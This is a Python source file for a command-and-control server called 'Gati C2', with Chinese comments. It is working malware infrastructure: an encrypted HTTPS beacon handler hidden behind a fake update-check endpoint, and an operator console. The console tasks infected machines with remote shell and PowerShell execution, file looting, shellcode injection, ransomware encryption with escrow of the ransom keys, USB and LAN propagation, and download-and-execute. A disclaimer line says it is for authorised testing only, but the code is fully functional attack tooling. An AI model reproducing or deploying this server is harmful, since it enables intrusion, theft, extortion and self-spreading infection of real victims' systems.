#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Gati C2 服务端
- HTTPS 服务端，AES-256-GCM 会话加密 + HMAC-SHA256 验签
- 密钥派生：session = SHA256(master | "|session|" | id) / mac = SHA256(master | "|mac|" | id)
- 指令下发、结果回收、勒索密钥托管解密
仅用于自有资产与授权环境的测试。
"""
import argparse
import base64
import hashlib
import hmac
import json
import os
import ssl
import sys
import threading
import time
import uuid
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

MASTER = b""
PRIV_KEY = None
DATA_DIR = "data"

lock = threading.Lock()
agents = {}        # id -> dict(info)
tasks = {}         # id -> list[task]
results = {}       # id -> list[dict]
keyvault = {}      # id -> bytes(明文主密钥)
last_seen = {}     # id -> ts


# ---------------------------------------------------------------- crypto
def derive(idstr: str):
    s = hashlib.sha256(MASTER + b"|session|" + idstr.encode()).digest()
    m = hashlib.sha256(MASTER + b"|mac|" + idstr.encode()).digest()
    return s, m


def open_packet(idstr: str, raw: bytes) -> dict:
    sess, mac = derive(idstr)
    if len(raw) < 13:
        raise ValueError("short packet")
    nonce, ct = raw[:12], raw[12:]
    plain = AESGCM(sess).decrypt(nonce, ct, idstr.encode())
    return json.loads(plain.decode("utf-8", "replace"))


def seal_packet(idstr: str, obj: dict):
    sess, mac = derive(idstr)
    nonce = os.urandom(12)
    ct = AESGCM(sess).encrypt(nonce, json.dumps(obj).encode(), idstr.encode())
    raw = nonce + ct
    sig = hmac.new(mac, raw, hashlib.sha256).hexdigest()
    return raw, sig


# ---------------------------------------------------------------- state
def save_state():
    os.makedirs(DATA_DIR, exist_ok=True)
    with open(os.path.join(DATA_DIR, "agents.json"), "w", encoding="utf-8") as f:
        json.dump({"agents": agents, "last_seen": last_seen}, f, ensure_ascii=False, indent=2)
    with open(os.path.join(DATA_DIR, "results.json"), "w", encoding="utf-8") as f:
        json.dump(results, f, ensure_ascii=False, indent=2)


def store_keyvault(idstr: str, wrapped_b64: str):
    """用 RSA 私钥解出信封里的 32 字节主密钥，落盘保存"""
    try:
        wrapped = base64.b64decode(wrapped_b64)
        master = PRIV_KEY.decrypt(
            wrapped,
            padding.PKCS1v15(),
        )
        keyvault[idstr] = master
        os.makedirs(os.path.join(DATA_DIR, "keys"), exist_ok=True)
        with open(os.path.join(DATA_DIR, "keys", idstr + ".key"), "wb") as f:
            f.write(master)
        return True
    except Exception as e:
        print(f"[!] keyvault decrypt failed for {idstr}: {e}")
        return False


# ---------------------------------------------------------------- http
class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, fmt, *a):
        pass

    def do_GET(self):
        # 伪装成一个普通更新检查接口，未授权访问不泄露任何信息
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", "2")
        self.end_headers()
        self.wfile.write(b"ok")

    def do_POST(self):
        idstr = self.headers.get("X-Gati-Id", "")
        sig = self.headers.get("X-Gati-Sig", "")
        n = int(self.headers.get("Content-Length", "0"))
        raw = self.rfile.read(n) if n else b""

        try:
            sess, mac = derive(idstr)
            expect = hmac.new(mac, raw, hashlib.sha256).hexdigest()
            if not hmac.compare_digest(expect, sig):
                raise ValueError("bad signature")
            env = open_packet(idstr, raw)
        except Exception as e:
            self.send_response(400)
            self.send_header("Content-Length", "0")
            self.end_headers()
            return

        with lock:
            now = time.time()
            is_new = idstr not in agents
            agents[idstr] = {
                "id": idstr,
                "host": env.get("host", "?"),
                "user": env.get("user", "?"),
                "priv": env.get("priv", "?"),
                "os": env.get("os", "?"),
                "first": agents.get(idstr, {}).get("first", now),
                "last": now,
                "beacons": agents.get(idstr, {}).get("beacons", 0) + 1,
            }
            last_seen[idstr] = now
            if is_new:
                print(f"\n[+] NEW AGENT {idstr}  {env.get('host')}\\{env.get('user')}  priv={env.get('priv')}")

            # 结果 / 密钥托管
            if env.get("type") == "result":
                data_b64 = env.get("data", "")
                try:
                    blob = base64.b64decode(data_b64)
                except Exception:
                    blob = b""
                text = blob.decode("utf-8", "replace")
                if text.startswith("KEYVAULT|"):
                    parts = text.split("|", 2)
                    if len(parts) == 3:
                        ok = store_keyvault(idstr, parts[2])
                        print(f"[KEY] keyvault {idstr} -> {'saved' if ok else 'FAILED'}")
                else:
                    results.setdefault(idstr, []).append({
                        "ts": now, "ok": env.get("ok", False), "data": data_b64,
                    })
                    print(f"\n[<] result from {idstr} ({'ok' if env.get('ok') else 'fail'}, {len(blob)} bytes)")

            # 取一条待发指令
            q = tasks.get(idstr) or []
            task = q.pop(0) if q else {"cmd": "none", "args": ""}
            save_state()

        body, s = seal_packet(idstr, task)
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("X-Gati-Sig", s)
        self.end_headers()
        self.wfile.write(body)


# ---------------------------------------------------------------- console
HELP = """
指令                     说明
-----------------------------------------------  --------------------------------
list / ls                 列出所有在线机器
use <id|序号>             选中目标
info                      目标系统信息
cmd <命令>                远程执行 cmd
ps <命令>                 远程执行 PowerShell
loot <通配符>             收集桌面/文档/下载里的文件（如 *.docx）
ls <目录>                 列目录
cat <文件>                读文件
put <路径> <本地文件>     上传文件（base64）
inject <pid|auto> <exe>   注入 shellcode（把本地 exe 当裸载荷写入目标内存）
ransom [目录]             加密目标目录并托管密钥
spread usb|lan|all        横向/U盘传播
dl <url>                  远程下载并执行
sleep <秒>                调整心跳（服务端侧仅记录）
uninstall                 清除持久化并自删
result                    查看最近回传
key                       查看已解出的勒索主密钥
agents                    同 list
exit                      退出
"""


def short_id(idstr, idx):
    return f"{idx}) {idstr}"


def console(server):
    current = None
    print(HELP)
    while True:
        try:
            prompt = f"gati[{current[:8] if current else '-'}]> "
            line = input(prompt).strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not line:
            continue
        if line in ("exit", "quit"):
            break
        parts = line.split(" ", 1)
        cmd = parts[0].lower()
        arg = parts[1] if len(parts) > 1 else ""

        with lock:
            if cmd in ("list", "ls", "agents") and not arg:
                if not agents:
                    print("(暂无上线机器)")
                    continue
                print(f"{'ID':18} {'主机':20} {'用户':14} {'权限':6} {'心跳':6} {'最后在线'}")
                for i, (k, a) in enumerate(agents.items(), 1):
                    ago = int(time.time() - a["last"])
                    print(f"{i:<3}{k:16} {a['host'][:19]:20} {a['user'][:13]:14} "
                          f"{a['priv']:6} {a['beacons']:<6} {ago}s 前")
                continue

            if cmd == "use":
                key = None
                if arg.isdigit():
                    idx = int(arg) - 1
                    keys = list(agents.keys())
                    if 0 <= idx < len(keys):
                        key = keys[idx]
                elif arg in agents:
                    key = arg
                if key:
                    current = key
                    print(f"[*] 已选中 {current}")
                else:
                    print("[!] 找不到该机器")
                continue

            if not current:
                print("[!] 先用 use <序号|ID> 选一台")
                continue

            if cmd == "info":
                a = agents[current]
                for k, v in a.items():
                    print(f"  {k:8} {v}")
                continue

            if cmd == "result":
                for r in results.get(current, [])[-10:]:
                    print(f"--- {time.strftime('%H:%M:%S', time.localtime(r['ts']))} ok={r['ok']} ---")
                    print(base64.b64decode(r["data"]).decode("utf-8", "replace"))
                continue

            if cmd == "key":
                for k, v in keyvault.items():
                    print(f"{k}: {v.hex()}")
                continue

            # 转发成任务
            mapping = {
                "cmd": "shell", "ps": "powershell", "loot": "loot", "ls": "ls",
                "cat": "cat", "inject": "inject", "ransom": "ransom",
                "spread": "spread", "sleep": "sleep", "uninstall": "uninstall",
            }
            if cmd == "put":
                try:
                    path, local = arg.split(" ", 1)
                    payload = base64.b64encode(open(local, "rb").read()).decode()
                    tasks.setdefault(current, []).append({"cmd": "put", "args": path + "::" + payload})
                    print("[*] 已入队")
                except Exception as e:
                    print(f"[!] {e}")
                continue
            if cmd == "dl":
                tasks.setdefault(current, []).append({"cmd": "download_exec", "args": arg})
                print("[*] 已入队")
                continue
            if cmd in mapping:
                if cmd == "ls" and not arg:
                    tasks.setdefault(current, []).append({"cmd": "ls", "args": ""})
                    print("[*] 已入队")
                elif cmd == "inject":
                    tasks.setdefault(current, []).append({"cmd": "inject", "args": arg})
                    print("[*] 已入队")
                else:
                    tasks.setdefault(current, []).append({"cmd": mapping[cmd], "args": arg})
                    print("[*] 已入队")
                continue

            print("[!] 未知指令，输入 help 查看")


def main():
    global MASTER, PRIV_KEY, DATA_DIR
    ap = argparse.ArgumentParser()
    ap.add_argument("--cert", required=True)
    ap.add_argument("--key", required=True)
    ap.add_argument("--master", required=True, help="16 进制 32 字节主密钥")
    ap.add_argument("--port", type=int, default=8443)
    ap.add_argument("--bind", default="0.0.0.0")
    ap.add_argument("--priv", default="keys/server_priv.pem")
    ap.add_argument("--data", default="data")
    ap.add_argument("--console", action="store_true")
    a = ap.parse_args()

    MASTER = bytes.fromhex(a.master)
    if len(MASTER) != 32:
        print("[!] master 必须是 32 字节（64 位十六进制）")
        sys.exit(1)
    DATA_DIR = a.data
    os.makedirs(DATA_DIR, exist_ok=True)

    try:
        PRIV_KEY = serialization.load_pem_private_key(open(a.priv, "rb").read(), password=None)
        print(f"[*] RSA 私钥已加载，可解密托管密钥")
    except Exception as e:
        print(f"[!] 私钥加载失败（托管密钥将无法解出）：{e}")

    srv = ThreadingHTTPServer((a.bind, a.port), Handler)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(a.cert, a.key)
    srv.socket = ctx.wrap_socket(srv.socket, server_side=True)

    threading.Thread(target=srv.serve_forever, daemon=True).start()
    print(f"[*] C2 listening on https://{a.bind}:{a.port}  (master={a.master[:8]}…)")

    if a.console:
        console(srv)
    else:
        try:
            while True:
                time.sleep(3600)
        except KeyboardInterrupt:
            pass


if __name__ == "__main__":
    main()
